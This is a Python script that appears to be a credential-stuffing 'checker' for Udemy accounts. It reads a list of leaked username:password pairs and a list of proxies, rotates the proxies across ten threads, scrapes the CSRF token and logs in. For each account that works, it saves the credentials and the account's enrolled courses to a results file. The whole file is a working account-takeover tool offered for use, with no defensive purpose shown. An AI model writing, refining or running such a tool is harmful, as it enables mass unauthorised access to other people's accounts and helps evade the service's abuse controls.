import requests, re, sys, time
from queue import Queue
from threading import Thread, Lock

mutex = Lock()
n_mutex = Lock()
n = 0

class uyChecker(Thread):

	def __init__(self, q):
		super().__init__()
		self.queue = q

	def login(self, username, password, proxy=None):
		global mutex
		headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0',
			'Accept': 'text/html',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate'
		}
		s = requests.session()
		try:
			req = s.get('https://www.udemy.com/join/login-popup/?locale=en_US&display_type=popup',
				headers=headers, proxies=proxy)
		except:
			return 1
		csrfmiddlewaretoken = None
		try:
			csrfmiddlewaretoken = re.findall('name=\'csrfmiddlewaretoken\' value=\'([^\']+)', req.text)[0]
		except:
			return 2
		headers['Referer'] = 'https://www.udemy.com/'
		try:
			req = s.post('https://www.udemy.com/join/login-popup/?display_type=popup&locale=en_US&response_type=json',
				data={'csrfmiddlewaretoken':csrfmiddlewaretoken,
					'email':username, 'password':password, 'locale':'en_US'}, headers=headers, proxies=proxy)
		except:
			return 3
		if 'Check your email and password or create an account' in req.text:
			return 4
		try:
			mutex.acquire()
			headers['Authorization'] = 'Bearer ' + s.cookies['access_token']
			headers['Accept'] = 'application/json, text/plain, */*'
			req = s.get('https://www.udemy.com/api-2.0/users/me/subscribed-courses/?ordering=-last_accessed&fields[course]=@min,visible_instructors,image_240x135,favorite_time,archive_time,completion_ratio,last_accessed_time,enrollment_time,is_practice_test_course,features,num_collections,published_title,is_private,buyable_object_type&fields[user]=@min,job_title&page=1&page_size=100',
				headers=headers)
			json_data = req.json()
			with open('result.txt', 'a') as fd:
				fd.write('%s:%s ----\r\n\r\n'%(username, password))
				for node in json_data['results']:
					fd.write('----\t' + node['title']+'\r\n')
				fd.write('%s ----\r\n'%('-' * (1+len(username)+len(password))))
			mutex.release()
		except:
			pass
		return 0

	def run(self):
		global n
		while True:
			e = self.queue.get()
			if e is None:
				break
			if self.login(e[0], e[1], e[2]) == 0:
				n_mutex.acquire()
				n += 1
				sys.stdout.write('\r----------- %d -----------'%n)
				sys.stdout.flush()
				n_mutex.release()


def main(p_fd, up_fd):
	max_Threads = 10
	queues = [Queue() for i in range(max_Threads)]
	checkers = [uyChecker(queues[i]) for i in range(max_Threads)]
	proxies = []
	with open(p_fd, 'r') as fd:
		proxies = fd.readlines()
	users_pwd = []
	with open(up_fd, 'r') as fd:
		users_pwd = fd.readlines()
	for ck in checkers:
		ck.start()
	i, j = 0, 0
	for u_p in users_pwd:
		if i == len(proxies): i=0
		if j == max_Threads: j=0
		proxy = proxies[i].split(':')
		u_p = u_p.split(':')
		data = [u_p[0], u_p[1].strip(), {'https':'https://%s:%s@%s:%s'%(proxy[2], proxy[3], proxy[0], proxy[1])}]
		queues[j].put(data)
		i+=1
		j+=1
	for q in queues:
		q.put(None)
	for ck in checkers:
		ck.join()

if __name__ == '__main__':
	if len(sys.argv) == 3:
		main(sys.argv[1], sys.argv[2])
	else:
		print('usage:\n%s <proxies> <user:pass>'%sys.argv[0])
